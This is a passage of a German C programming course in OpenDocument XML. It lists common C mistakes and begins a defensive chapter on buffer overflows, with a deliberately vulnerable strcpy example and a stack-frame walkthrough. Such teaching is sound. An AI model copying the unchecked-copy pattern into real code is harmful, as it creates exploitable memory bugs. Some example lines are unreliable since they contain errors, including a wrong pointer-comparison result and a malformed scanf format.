      <text:p text:style-name="code">int i;</text:p>
      <text:p text:style-name="code">...</text:p>
      <text:p text:style-name="code">if (<text:span text:style-name="T6">i = 5</text:span>) { //i = 5 ist eine Zuweisung, immer TRUE! <text:line-break/>... </text:p>
      <text:p text:style-name="code">} <text:line-break/> </text:p>
      <text:p text:style-name="code">Besser:</text:p>
      <text:p text:style-name="code">if (5 = i) { //konstante links, dann schimpft bereits der Compiler!!!<text:line-break/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1854_390052085"/><text:span text:style-name="T3">Verwechslung von ' und "</text:span> <text:bookmark-end text:name="__RefHeading__1854_390052085"/></text:h>
      <text:p text:style-name="code"><text:span text:style-name="T5">Erklärung</text:span>: <text:s text:c="4"/>' ...... Begrenzung eines einzelnen Zeichens <text:line-break/> <text:s text:c="14"/>" ...... Begrenzung einer Zeichenkette <text:line-break/><text:span text:style-name="T5">Beispiel</text:span>: <text:line-break/> <text:s text:c="14"/>char zeichen, zeichenkette[6]; <text:line-break/> <text:s/><text:line-break/> <text:s text:c="14"/>zeichen = 'z'; <text:s text:c="15"/>// richtig! <text:line-break/> <text:s text:c="14"/>zeichen = "z"; <text:s text:c="15"/>// falsch! </text:p>
      <text:p text:style-name="code"><text:line-break/> <text:s text:c="14"/>strcpy(zeichenkette,"test"); <text:s/>// richtig! <text:line-break/> <text:s text:c="14"/>strcpy(zeichenkette,'test'); <text:s/>// falsch! <text:line-break/> <text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1856_390052085"/><text:span text:style-name="T3">Verwechslung der Stellung von In/Dekrement-Operatoren</text:span> <text:bookmark-end text:name="__RefHeading__1856_390052085"/></text:h>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: <text:s text:c="5"/>x = ++i; <text:s/>// x erhält den neuen Wert von i <text:line-break/><text:soft-page-break/> <text:s text:c="14"/>x = i++; <text:s/>// x erhält den alten Wert von i <text:line-break/> <text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1858_390052085"/><text:span text:style-name="T3">Kontrollstrukturen</text:span> <text:bookmark-end text:name="__RefHeading__1858_390052085"/></text:h>
      <text:p text:style-name="P13">Strichpunkte hinter einer Kontrollanweisung (if, for, while) entsprechen einer Leeranweisung. </text:p>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: <text:line-break/> <text:s text:c="8"/>for (int i=0; i&lt;10; i++)<text:span text:style-name="T6">;</text:span> <text:line-break/> <text:s text:c="11"/>printf("%i",i); <text:s text:c="13"/>// i wird nur einmal ausgegeben </text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1860_390052085"/><text:span text:style-name="T3">Fehlendes break im switch-Statement</text:span> <text:bookmark-end text:name="__RefHeading__1860_390052085"/></text:h>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: </text:p>
      <text:p text:style-name="code"><text:s text:c="7"/>switch(i) { <text:line-break/> <text:s text:c="10"/>case 1: printf("eins"); break; <text:s text:c="2"/>// Ausgabe: <text:s/>eins <text:line-break/> <text:s text:c="10"/>case 2: printf("zwei"); <text:s text:c="9"/>// Ausgabe: <text:s/>zweidrei <text:line-break/> <text:s text:c="10"/>case 3: printf("drei"); break; <text:s text:c="2"/>// Ausgabe: <text:s/>drei <text:line-break/> <text:s text:c="6"/>} </text:p>
      <text:p text:style-name="P11"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1862_390052085"/>Fehler bei Arrays<text:bookmark-end text:name="__RefHeading__1862_390052085"/></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1864_390052085"/><text:span text:style-name="T3">Bereichsüberschreitung</text:span> <text:bookmark-end text:name="__RefHeading__1864_390052085"/></text:h>
      <text:p text:style-name="P13">In C beginnen Arrays mit dem Index 0, hingegen bei der Vereinbarung wird die Anzahl der Elemente des Arrays angegeben. </text:p>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: <text:line-break/> <text:s/>int feld[100]; <text:s text:c="16"/>// Index von 0 bis 99 </text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:s text:c="2"/>for (int i = 0; i&lt;<text:span text:style-name="T7">=</text:span>100; i++) <text:s text:c="2"/>// Der Arraybereich wird überschritten <text:line-break/> <text:s text:c="4"/>{ <text:line-break/> <text:s text:c="8"/>printf("%i",feld[i]); <text:line-break/> <text:s text:c="8"/>... <text:line-break/> <text:s text:c="4"/>} <text:line-break/> <text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1866_390052085"/><text:span text:style-name="T3">Arrays als Parameter</text:span> <text:bookmark-end text:name="__RefHeading__1866_390052085"/></text:h>
      <text:p text:style-name="Standard">Arrays werden immer als Zeiger auf das erste Element übergeben. <text:line-break/></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: </text:p>
      <text:p text:style-name="code"><text:s text:c="5"/>void test (char name[<text:span text:style-name="T6">6</text:span>]) <text:line-break/> <text:s text:c="4"/>{ <text:line-break/> <text:s text:c="8"/>printf("%i",sizeof(name)); <text:line-break/> <text:s text:c="4"/>} </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Beachte</text:span>: Diese Funktion gibt die Zeigergröße (je nach Speichermodell 2 bzw. 4) und nicht die Arraygröße aus!</text:p>
      <text:p text:style-name="P11"><text:soft-page-break/></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1868_390052085"/>Fehler bei der Stringbehandlung<text:bookmark-end text:name="__RefHeading__1868_390052085"/></text:h>
      <text:p text:style-name="P10">Grundsätzlich treten bei der Verwendung von Strings, bedingt durch deren gleiche Implementierung, die selben Fehler wie bei Arrays auf! </text:p>
      <text:p text:style-name="P10"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1870_390052085"/><text:span text:style-name="T3">nicht abgeschlossene Strings</text:span> <text:bookmark-end text:name="__RefHeading__1870_390052085"/></text:h>
      <text:p text:style-name="Standard"><text:s text:c="2"/>In C werden Strings als Arrays von einzelnen Zeichen abgespeichert. Das Ende des Strings wird durch eine Abschlußnull (ASCII 0) definiert. Fehlt diese Null wird das Stringende von Stringfunktionen nicht erkannt! <text:line-break/> <text:s/></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: <text:line-break/> <text:s text:c="3"/>char t1[5]="test"; <text:line-break/> <text:s text:c="3"/>char t2[6]; </text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:s text:c="4"/>strncpy(t2, t1, 2); <text:s text:c="2"/>// <text:span text:style-name="T6">t2 ist nicht durch eine Null</text:span> abgeschlossen <text:line-break/> <text:s text:c="3"/></text:p>
      <text:p text:style-name="code"><text:s text:c="4"/>printf("%s",t2); <text:s text:c="5"/>// gibt den String t2 und den gesammten</text:p>
      <text:p text:style-name="code"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>// Speicherinhalt bis zur ersten ASCII 0 aus! <text:s text:c="2"/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1872_390052085"/><text:span text:style-name="T3">Vergleich bzw. Zuweisung</text:span> <text:bookmark-end text:name="__RefHeading__1872_390052085"/></text:h>
      <text:p text:style-name="Standard">== .... Vergleicht Adressen, nicht die Inhalte <text:line-break/>= ..... setzt Adresse um, kopiert nicht die Inhalte </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">=&gt; Vergleichen von Inhalten mit strcmp <text:line-break/>=&gt; Zuweisen von Inhalten mit strcpy </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: </text:p>
      <text:p text:style-name="code"><text:s text:c="6"/>char name1[5]="test"; <text:line-break/> <text:s text:c="5"/>char name2[5]="test"; <text:line-break/> <text:s text:c="5"/>char* name3;</text:p>
      <text:p text:style-name="code"><text:s text:c="6"/>char name4[5]; <text:line-break/></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T6"><text:s text:c="6"/></text:span><text:span text:style-name="T10">name3 = name1;</text:span><text:span text:style-name="T6"> </text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>name4= name1;</text:p>
      <text:p text:style-name="code"><text:span text:style-name="T6"><text:line-break/> <text:s text:c="5"/>if (name1 == name2) <text:s/>{} <text:s text:c="11"/>// =&gt; FALSE <text:line-break/> <text:s text:c="5"/>if (name1 == name3) <text:s/>{} <text:s text:c="11"/>// =&gt; FALSE <text:line-break/></text:span><text:span text:style-name="T10"> <text:s text:c="5"/>if (strcmp(name1, name2) == 0) <text:s text:c="4"/>// =&gt; TRUE <text:line-break/></text:span> <text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1874_390052085"/><text:span text:style-name="T3">Unterschied zwischen Leerstring und NULL</text:span> <text:bookmark-end text:name="__RefHeading__1874_390052085"/></text:h>
      <text:p text:style-name="P13">Der Leerstring entspricht einem Character-Array bei dem das 1. Element ASCII 0 ist. <text:line-break/>NULL ist eine Konstante, die angibt, daß ein Zeiger den Wert 0 hat. </text:p>
      <text:p text:style-name="P13"><text:soft-page-break/></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: <text:line-break/> char *x1 = NULL; <text:s/>// Zeiger hat den Wert 0 <text:line-break/> char *x2 = ""; <text:s text:c="3"/>// Zeiger zeigt auf eine Speicherstelle in dem 0</text:p>
      <text:p text:style-name="code"><text:tab/><text:tab/><text:tab/><text:tab/>// steht</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1876_390052085"/>Fehler bei Zeigern<text:bookmark-end text:name="__RefHeading__1876_390052085"/></text:h>
      <text:p text:style-name="P12"><text:s text:c="2"/></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1878_390052085"/><text:span text:style-name="T3">nicht initialisierte Zeiger</text:span> <text:bookmark-end text:name="__RefHeading__1878_390052085"/></text:h>
      <text:p text:style-name="P13">Zeiger zeigen vor der Initialisierung auf irgendeine Adresse im Speicher, daher müssen sie vor ihrer Verwendung immer initialisiert werden bzw. Speicher muß reserviert werden! </text:p>
      <text:p text:style-name="P13"><text:line-break/> <text:s/></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: <text:line-break/> <text:s text:c="4"/>char feld[10]; <text:line-break/> <text:s text:c="4"/>char* s1; <text:line-break/> <text:s text:c="4"/>char* s2 = feld; </text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:s/><text:span text:style-name="T6"><text:s text:c="4"/>strcpy (s1, "Text"); <text:s text:c="2"/>// falsch <text:line-break/> </text:span><text:span text:style-name="T10"><text:s text:c="4"/>strcpy (s2, "Text"); <text:s text:c="2"/>// richtig</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1880_390052085"/>Fehler bei Funktionsaufrufen<text:bookmark-end text:name="__RefHeading__1880_390052085"/></text:h>
      <text:p text:style-name="P12">Call-by_reference muss in C mittels Adressvariablen realisiert werden. </text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1882_390052085"/><text:span text:style-name="T3">Funktionsaufruf</text:span> <text:span text:style-name="T3">stimmt mit der Vereinbarung nicht überein</text:span> <text:bookmark-end text:name="__RefHeading__1882_390052085"/></text:h>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: <text:line-break/> <text:s text:c="3"/>int zahl; <text:line-break/><text:line-break/> <text:s text:c="3"/><text:span text:style-name="T6">scanf(" %d ", zahl); <text:s/>//Falsch! es wird ein Zeiger erwartet! </text:span><text:line-break/> <text:s text:c="3"/>scanf(" %d ",&amp;zahl); <text:s/>//Richtig! <text:line-break/> <text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1884_390052085"/><text:span text:style-name="T3">Der Funktionsaufruf ist richtig, die Bedeutung jedoch falsch</text:span> <text:bookmark-end text:name="__RefHeading__1884_390052085"/></text:h>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: <text:line-break/> <text:s/><text:line-break/> <text:s text:c="4"/>Falsch: <text:line-break/><text:span text:style-name="T6"> <text:s text:c="7"/>int *zahl; <text:line-break/> <text:s text:c="7"/>scanf("%d", zahl); <text:s text:c="2"/>// Zeiger ist nicht initialisiert! </text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="code"><text:soft-page-break/><text:s text:c="5"/>Richtig: <text:line-break/> <text:s text:c="7"/>int zahl, *pzahl; <text:line-break/> <text:s text:c="7"/>pzahl = &amp;zahl; <text:line-break/> <text:s text:c="7"/>scanf("&amp;d", pzahl);</text:p>
      <text:p text:style-name="P11"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1886_390052085"/>Fehler bei der Typkonvertierung<text:bookmark-end text:name="__RefHeading__1886_390052085"/></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1888_390052085"/><text:span text:style-name="T3">Ausdrücke</text:span> <text:bookmark-end text:name="__RefHeading__1888_390052085"/></text:h>
      <text:p text:style-name="P13">Werden Variablen unterschiedlichen Typs einander zugewiesen, so laufen automatische Konvertiermechanismen ab. </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Ergebnistyp ist vom Operandentyp abhängig!</text:span> <text:line-break/> <text:s/></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: <text:line-break/> <text:s text:c="3"/>float f; <text:line-break/> <text:s text:c="3"/>int i1, i2; <text:line-break/> <text:s text:c="3"/>long l; <text:line-break/> <text:s text:c="3"/>... <text:line-break/> <text:s text:c="3"/>f=1/5; <text:s text:c="7"/>// <text:span text:style-name="T6">f erhält den Wert 0 anstatt 0.2</text:span> <text:line-break/> <text:s text:c="3"/>... <text:line-break/> <text:s text:c="3"/>l=i1*i2 <text:s text:c="6"/>// Überlauf wenn 32767 überschritten wird <text:line-break/> <text:s text:c="3"/>... <text:line-break/> <text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1890_390052085"/><text:span text:style-name="T3">Char und Int Konvertierung</text:span> <text:bookmark-end text:name="__RefHeading__1890_390052085"/></text:h>
      <text:p text:style-name="P13">Grundsätzlich kann mit Char- wie mit Int-Werten gerechnet werden. Bei der Ausgabe gibt es jedoch Unterschiede. </text:p>
      <text:p text:style-name="code"><text:span text:style-name="T5">Beispiel</text:span>: <text:line-break/> <text:s/><text:line-break/> <text:s text:c="3"/>char zeichen; <text:line-break/> <text:s text:c="3"/>... <text:line-break/> <text:s text:c="3"/>zeichen = 'ä'; <text:s text:c="10"/>// ASCII 132 <text:line-break/> <text:s text:c="3"/>... <text:line-break/> <text:s text:c="3"/>printf("%d", zeichen); <text:s text:c="2"/>// Ausgabe: -124 </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Lösung</text:span>: zeichen als unsigned char vereinbaren!</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="Emphasis"/></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1892_390052085"/>MEILENSTEIN: Finde den Fehler<text:bookmark-end text:name="__RefHeading__1892_390052085"/></text:h>
      <text:p text:style-name="Text_20_body">Beantworten Sie die Fragen in <text:s/>03-wissen/mab-findeFehler.txt</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P13"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:bookmark-start text:name="__RefHeading__1894_390052085"/><text:soft-page-break/>Buffer-Overflow (Speicherüberlauf)<text:bookmark-end text:name="__RefHeading__1894_390052085"/></text:h>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Text_20_body"><text:a xlink:type="simple" xlink:href="http://openbook.galileocomputing.de/c_von_a_bis_z/">http://openbook.galileocomputing.de/c_von_a_bis_z/</text:a></text:p>
      <text:p text:style-name="Text_20_body"><text:s/></text:p>
      <text:p text:style-name="Text_20_body">Eines der bekanntesten und am häufigsten auftretenden Sicherheitsprobleme ist der Buffer-Overflow (dt.: Speicherüberlauf, Pufferüberlauf), häufig auch als Buffer Overrun bezeichnet.</text:p>
      <text:p text:style-name="Text_20_body">Geben Sie einmal in einer Internet-Suchmaschine den Begriff »Buffer-Overflow« ein, und Sie werden angesichts der enormen Anzahl von Ergebnissen überrascht sein. Es gibt unzählige Programme, die für einen Buffer-Overflow anfällig sind. Das Ziel des Angreifers ist es dabei, den Buffer-Overflow auszunutzen, <text:span text:style-name="T4">um in das System einzubrechen</text:span>.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Die Aufgabe dieses Abschnitts ist es nicht, Ihnen beizubringen, wie Sie Programme hacken können, sondern zu erklären, was ein Buffer-Overflow ist, wie dieser ausgelöst wird und <text:span text:style-name="T4">was Sie als Programmierer beachten müssen, damit Ihr Programm nicht anfällig</text:span> dafür ist.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Für den Buffer-Overflow ist immer der Programmierer selbst verantwortlich. Der Overflow kann überall dort auftreten, wo </text:p>
      <text:list xml:id="list8588276661" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P26">Daten von der Tastatur, dem Netzwerk oder einer anderen Quelle aus </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P26">in einen Speicherbereich mit statischer Größe </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P25"><text:span text:style-name="T4">ohne eine Längenüberprüfung geschrieben werden.</text:span> </text:p>
          <text:p text:style-name="P25"/>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">Hier sehen Sie ein solches Negativbeispiel:</text:p>
      <text:p text:style-name="code">/* bufferoverflow1.c */</text:p>
      <text:p text:style-name="code">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="code">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="code">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code">int main(void) {</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/>char *str = "0123456789012";</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/>char buf[10];</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="P4"><text:s text:c="3"/>strcpy(buf, str);</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/>printf("%s",buf);</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:s text:c="3"/>return EXIT_SUCCESS;</text:p>
      <text:p text:style-name="code">}</text:p>
      <text:p text:style-name="Text_20_body">Hier wurde ein Buffer-Overflow mit der Funktion <text:span text:style-name="T6">strcpy</text:span>() erzeugt. Es wird dabei versucht, in den char-Vektor, der Platz für 10 Zeichen reserviert hat, mehr als diese 10 Zeichen zu kopieren.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/><draw:frame draw:style-name="fr1" draw:name="Grafik9" text:anchor-type="as-char" svg:width="15.875cm" svg:height="6.962cm" draw:z-index="0"><draw:image xlink:href="../../../../../../../macos_ubuntu/MEINEBOOKMARKS/books/c_von_a_bis_z/bilder/27_001.gif" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/><svg:title>file:///Users/ahofmann/home/macos_ubuntu/MEINEBOOKMARKS/books/c_von_a_bis_z/bilder/27_001.gif</svg:title></draw:frame></text:p>
      <text:p text:style-name="Text_20_body"><text:bookmark text:name="IDAYEUQ"/><text:line-break/><text:span text:style-name="Strong_20_Emphasis">Abbildung 27.1 </text:span>Pufferüberlauf mit der Funktion »strcpy()«</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Die Auswirkungen eines Buffer Overflows sind stark vom Betriebssystem abhängig. Häufig stürzt dabei das Programm ab, weil <text:span text:style-name="T4">Variablen</text:span> mit irgendwelchen Werten <text:span text:style-name="T4">überschrieben</text:span> wurden. Manches Mal bekommen Sie aber auch nach Beendigung des Programms eine Fehlermeldung zurück, etwa <text:span text:style-name="T4">Speicherzugriffsfehler</text:span>. </text:p>
      <text:p text:style-name="Text_20_body">Dies wird ausgegeben, wenn z. B. die <text:span text:style-name="T4">Rücksprungadresse des Programms überschrieben</text:span> wurde und das Programm irgendwo in eine unerlaubte Speicheradresse springt.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:list xml:id="list828801472" text:continue-list="list398504580" text:style-name="List_20_3">
        <text:list-item>
          <text:p text:style-name="P24">Exploit:<text:line-break/>Wird aber bewusst diese <text:span text:style-name="T4">Rücksprungadresse manipuliert</text:span> und auf einen speziell von Ihnen erstellten Speicherbereich verwiesen bzw. gesprungen, der <text:span text:style-name="T4">echten Code</text:span> enthält, haben Sie einen sogenannten Exploit erstellt.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P14"><text:bookmark text:name="mj413be9e741bc9226ff3f5e288cf6d663"/><text:bookmark text:name="t31"/></text:p>
      <text:p text:style-name="P7"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1896_390052085"/><text:bookmark text:name="t2t32"/>Speicherverwaltung von Programmen<text:bookmark-end text:name="__RefHeading__1896_390052085"/></text:h>
      <text:p text:style-name="Text_20_body">Ein Programm besteht aus drei Speichersegmenten, die im Arbeitsspeicher liegen. </text:p>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/><draw:frame draw:style-name="fr1" draw:name="Grafik10" text:anchor-type="as-char" svg:width="5.057cm" svg:height="10.749cm" draw:z-index="1"><draw:image xlink:href="../../../../../../../macos_ubuntu/MEINEBOOKMARKS/books/c_von_a_bis_z/bilder/27_002.gif" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/><svg:title>file:///Users/ahofmann/home/macos_ubuntu/MEINEBOOKMARKS/books/c_von_a_bis_z/bilder/27_002.gif</svg:title></draw:frame><text:bookmark text:name="IDAMFUQ"/><text:line-break/></text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Abbildung 27.2 </text:span>Speicherverwaltung – die einzelnen Segmente<text:line-break/></text:p>
      <text:list xml:id="list609016426" text:continue-numbering="true" text:style-name="List_20_3">
        <text:list-item>
          <text:p text:style-name="P24"><text:span text:style-name="T4">Code-Segment (Text-Segment) </text:span>– <text:line-break/>Hier befinden sich die Maschinenbefehle, die vom Prozessor beim HOLEN-Zyklus eingelesen werden – oder einfacher gesagt: der Programmcode selbst. Das Code-Segment lässt sich nicht manipulieren, hat eine feste Größe und <text:span text:style-name="T4">ist gegen Überschreiben geschützt</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P24"><text:span text:style-name="T4">Heap-Segment (Daten-Segment)</text:span> – <text:line-break/>Hier liegen die Variablen (extern, static), Felder (Arrays) und Tabellen des Programms. Der Maschinenbefehl, der diese Daten benötigt, greift auf dieses Segment zu. <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P21"><text:span text:style-name="T4">Stack-Segment</text:span> – <text:line-break/>Hier befinden sich </text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P23">Parameter</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P21"><text:span text:style-name="T4">Rücksprungadressen</text:span> von Funktionen und</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P21"><text:span text:style-name="T4">lokale Variablen</text:span> <text:line-break/></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P22"><text:span text:style-name="T11">Stackpointer:</text:span></text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P22"><text:span text:style-name="T11">heißt ESP </text:span><text:span text:style-name="T12">und weil der Stack 'von oben nach unten wandert' wird</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P22"><text:span text:style-name="T11">bei push wird ESP dekrementiert</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P22"><text:span text:style-name="T11">bei pop wird ESP addiert</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P9">Der Stack ist auch das Angriffsziel für einen Buffer-Overflow.</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="Text_20_body">Es sei hierbei noch erwähnt, dass der Stack-Bereich nach unten und der Heap nach oben anwächst. </text:p>
      <text:p text:style-name="P14"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1898_390052085"/><text:bookmark text:name="t2t33"/><text:soft-page-break/>Der Stack-Frame <text:bookmark-end text:name="__RefHeading__1898_390052085"/></text:h>
      <text:p text:style-name="Text_20_body"><text:a xlink:type="simple" xlink:href="http://insecure.org/stf/smashstack.html">http://insecure.org/stf/smashstack.html</text:a></text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Für jede Funktion steht ein sogenannter <text:span text:style-name="T4">Stack-Frame</text:span> im Stack zur Verfügung, in dem die <text:span text:style-name="T4">Parameter, Rücksprungsadresse und die lokalen Variablen</text:span> gespeichert werden. </text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Wie die Organisation des Stack-Frames aussieht, wollen wir an den folgenden Beispielen besprechen.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="code">/* stackframe.c </text:p>
      <text:p text:style-name="code"><text:s/>* gcc stackframe.c -o stackframe.exe</text:p>
      <text:p text:style-name="code"><text:s/>*/</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="code">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code">int my_func(int wert1, int wert2) {</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/>int summe;</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:s text:c="3"/>summe = wert1+wert2;</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/></text:p>
      <text:p text:style-name="code"><text:s text:c="3"/>return summe;</text:p>
      <text:p text:style-name="code">}</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code">int main(void) {</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/>int ergebnis;</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:tab/>ergebnis= my_func(1,2);</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:tab/>printf("ergebnis: %d \n", ergebnis);</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/></text:p>
      <text:p text:style-name="code"><text:tab/>return 0;</text:p>
      <text:p text:style-name="code">}</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Übersetzen Sie das Programm mit</text:p>
      <text:p text:style-name="code">gcc stackframe.c -o stackframe.exe</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">In der Funktion main() geschieht beim Aufruf der Funktion my_func(1,2) folgendes:</text:p>
      <text:list xml:id="list9019864001" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P37">Mit dem Assembler-Befehl PUSH werden die Werte<text:span text:style-name="T4"> 2 und 1 auf den Stack</text:span> geschrieben. <text:line-break/>In der Funktion my_func(int wert1, int wert2) erhält dadurch der <text:line-break/>Parameter wert2 die Zahl 2 und der <text:line-break/>Parameter wert1 die Zahl 1. <text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P37">Mit dem Assembler-Befehl <text:span text:style-name="T4">CALL</text:span> erhält der InstructionPointer der CPU die Speicheradresse des 1. Befehls der Funktion my_func().<text:line-break/>Zuvor wird aber die sogenannte <text:span text:style-name="T4">Rücksprungadresse </text:span>(die Adresse des nächsten Befehls NACH DEM Aufruf von my_func()) auf den Stack gespeichert.<text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
